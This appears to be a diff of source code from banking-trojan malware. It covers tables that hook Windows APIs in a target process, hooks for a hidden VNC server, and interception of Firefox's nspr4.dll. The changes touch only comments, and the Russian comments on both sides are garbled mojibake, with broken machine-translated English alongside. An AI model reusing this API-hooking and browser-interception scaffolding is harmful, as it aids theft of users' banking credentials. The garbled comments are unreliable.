@@ -38,9 +38,9 @@ void WinApiTables::uninit(void)
 }
 
 /*
-  Âûáîð ôóíêöèé äëÿ óâåäîìëåíèè î ñîçäàíèè ïðîöåññà.
+  Ð’Ñ‹Ð±Ð¾Ñ€ Ñ„ÑƒÐ½ÐºÑ†Ð¸Ð¹ Ð´Ð»Ñ ÑƒÐ²ÐµÐ´Ð¾Ð¼Ð»ÐµÐ½Ð¸Ð¸ Ð¾ ÑÐ¾Ð·Ð´Ð°Ð½Ð¸Ð¸ Ð¿Ñ€Ð¾Ñ†ÐµÑÑÐ°.
 
-  OUT hwa - ðåçóëüòàò âûáîðà.
+  OUT hwa - Ñ€ÐµÐ·ÑƒÐ»ÑŒÑ‚Ð°Ñ‚ Ð²Ñ‹Ð±Ð¾Ñ€Ð°.
 */
 static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
 {
@@ -57,14 +57,14 @@ static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
 }
 
 /*
-  Ñíèìàåò ïåðåõâàòûâàò ñî âñåx WinApi èç ñïèñêà
+  Ð¡Ð½Ð¸Ð¼Ð°ÐµÑ‚ Ð¿ÐµÑ€ÐµÑ…Ð²Ð°Ñ‚Ñ‹Ð²Ð°Ñ‚ ÑÐ¾ Ð²ÑÐµx WinApi Ð¸Ð· ÑÐ¿Ð¸ÑÐºÐ°
 
-  IN process            - ïðîöåññ.
-  IN OUT list           - ñïèñîê.
-  IN count              - êîë. ýåëåìåíòîâ.
+  IN process            - Ð¿Ñ€Ð¾Ñ†ÐµÑÑ.
+  IN OUT list           - ÑÐ¿Ð¸ÑÐ¾Ðº.
+  IN count              - ÐºÐ¾Ð». ÑÐµÐ»ÐµÐ¼ÐµÐ½Ñ‚Ð¾Ð².
 
-  Return                - true - åñëè ñíÿòü ïåðåõâàò ñî âñåõ WinApi,
-                          false - åñëè íå ñíÿò ïåðåõâàò õîòÿ áû ñ îäíîé WinAPI.
+  Return                - true - ÐµÑÐ»Ð¸ ÑÐ½ÑÑ‚ÑŒ Ð¿ÐµÑ€ÐµÑ…Ð²Ð°Ñ‚ ÑÐ¾ Ð²ÑÐµÑ… WinApi,
+                          false - ÐµÑÐ»Ð¸ Ð½Ðµ ÑÐ½ÑÑ‚ Ð¿ÐµÑ€ÐµÑ…Ð²Ð°Ñ‚ Ñ…Ð¾Ñ‚Ñ Ð±Ñ‹ Ñ Ð¾Ð´Ð½Ð¾Ð¹ WinAPI.
 */
 static bool unhookList(HANDLE process, HOOKWINAPI *list, DWORD count)
 {
@@ -93,15 +93,15 @@ static void hotPatchCallback(const void *functionForHook, const void *originalFu
   Core::replaceFunction(functionForHook, originalFunction);
 }
 
-/*Â Â Intercepts all WinApi list
+/*Ð’Â Ð’Â Intercepts all WinApi list
 
-Â Â IN process - a process.
-Â Â IN OUT list - a list.
-Â Â IN count - count. eelementov.
-Â Â IN realCount - col. eelementov, should be equal. The meaning of this concept in the code.
+Ð’Â Ð’Â IN process - a process.
+Ð’Â Ð’Â IN OUT list - a list.
+Ð’Â Ð’Â IN count - count. eelementov.
+Ð’Â Ð’Â IN realCount - col. eelementov, should be equal. The meaning of this concept in the code.
 
-Â Â Return - true - if all intercepted WinApi,
-Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â false - if not caught at least one of WinAPI.*/
+Ð’Â Ð’Â Return - true - if all intercepted WinApi,
+Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â Ð’Â false - if not caught at least one of WinAPI.*/
 static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCount)
 {
   //Insured.
@@ -159,7 +159,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//Â Table interception for a custom process.
+//Ð’Â Table interception for a custom process.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 static HOOKWINAPI userHooks[] =
 {
@@ -220,7 +220,7 @@ static HOOKWINAPI userHooks[] =
   {NULL, VncServer::hookerGetDcEx,                      NULL, 0},
   {NULL, VncServer::hookerGetDc,                        NULL, 0},
   {NULL, VncServer::hookerGetWindowDc,                  NULL, 0},
-  {NULL, VncServer::hookerReleaseDñ,                    NULL, 0},
+  {NULL, VncServer::hookerReleaseDÑ,                    NULL, 0},
   {NULL, VncServer::hookerGetUpdateRect,                NULL, 0},
   {NULL, VncServer::hookerGetUpdateRgn,                 NULL, 0},
   
@@ -338,7 +338,7 @@ bool WinApiTables::_removeUserHooks(void)
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//Â Table interception nspr4.dll.
+//Ð’Â Table interception nspr4.dll.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 #if(BO_NSPR4 > 0)
